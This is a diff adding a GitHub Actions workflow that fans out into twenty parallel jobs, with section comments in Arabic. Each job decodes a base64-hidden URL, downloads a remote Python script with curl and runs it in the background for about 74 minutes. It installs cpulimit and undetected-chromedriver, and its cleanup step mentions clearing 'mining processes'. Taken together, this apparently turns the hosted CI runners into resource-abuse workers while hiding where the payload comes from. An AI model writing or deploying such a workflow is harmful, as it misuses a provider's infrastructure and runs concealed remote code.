@@ -1,0 +1,85 @@
+name: Linux Elastic Task Squadron
+
+on:
+  repository_dispatch:
+    types: [run-task]
+  workflow_dispatch:
+
+concurrency:
+  group: task-squadron-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  launch-squadrons:
+    name: "SquadUnit-${{ matrix.squad_index }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+
+    strategy:
+      fail-fast: false
+      matrix:
+        squad_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ─────────────────────────────────────────────────────────────
+      # [المرحلة الأولى] تهيئة البنية التحتية
+      # ─────────────────────────────────────────────────────────────
+      - name: Provision Infrastructure Layer
+        run: |
+          echo "[INFRA] Deploying SquadUnit ${{ matrix.squad_index }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y cpulimit curl python3-pip
+
+      # ─────────────────────────────────────────────────────────────
+      # [المرحلة الثانية] جلب الملف التنفيذي من المصدر
+      # ─────────────────────────────────────────────────────────────
+      - name: Retrieve Executable Binary
+        run: |
+          echo "[BINARY] Fetching app_task.py from upstream location..."
+          UPSTREAM_LINK=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvYWFhL3Jlc29sdmUvbWFpbi9zdGFydC5weQ==" | base64 --decode)
+          curl -sL "$UPSTREAM_LINK" -o app_task.py
+          echo "[BINARY] Binary fetched successfully."
+
+      # ─────────────────────────────────────────────────────────────
+      # [المرحلة الثالثة] تثبيت الوحدات البرمجية
+      # ─────────────────────────────────────────────────────────────
+      - name: Mount Python Modules
+        run: |
+          echo "[MOUNT] Mounting required Python libraries..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ─────────────────────────────────────────────────────────────
+      # [المرحلة الرابعة] تشغيل المهمة تحت إشراف زمني
+      # ─────────────────────────────────────────────────────────────
+      - name: Activate Task Under Time Warden
+        run: |
+          echo ">> Spinning up SquadUnit ${{ matrix.squad_index }}..."
+          
+          # تفعيل السكربت في الخلفية
+          python3 app_task.py &
+          SQUAD_PID=$!
+          
+          echo ">> Time warden standing by. Window: 74 minutes."
+          
+          # الانتظار حتى انقضاء المدة المسموحة
+          sleep 4440
+          
+          # فحص العملية وإيقافها إذا لزم الأمر
+          if kill -0 $SQUAD_PID 2>/dev/null; then
+            echo ">> Window closed! Terminating task..."
+            kill -9 $SQUAD_PID
+            echo ">> Task terminated forcibly."
+          else
+            echo ">> Task closed within the allowed window."
+          fi
+
+      # ─────────────────────────────────────────────────────────────
+      # [المرحلة الخامسة] تنظيف الموارد وإغلاق الوحدة
+      # ─────────────────────────────────────────────────────────────
+      - name: Release and Decommission
+        run: |
+          echo "[RELEASE] SquadUnit ${{ matrix.squad_index }} is decommissioning."
+          echo "[RELEASE] Clearing residual cpulimit and mining processes..."
+          sudo pkill -f cpulimit || true
+          sudo pkill -f systemd-logind || true
+          echo "[DECOMMISSIONED] SquadUnit ${{ matrix.squad_index }} decommissioned."
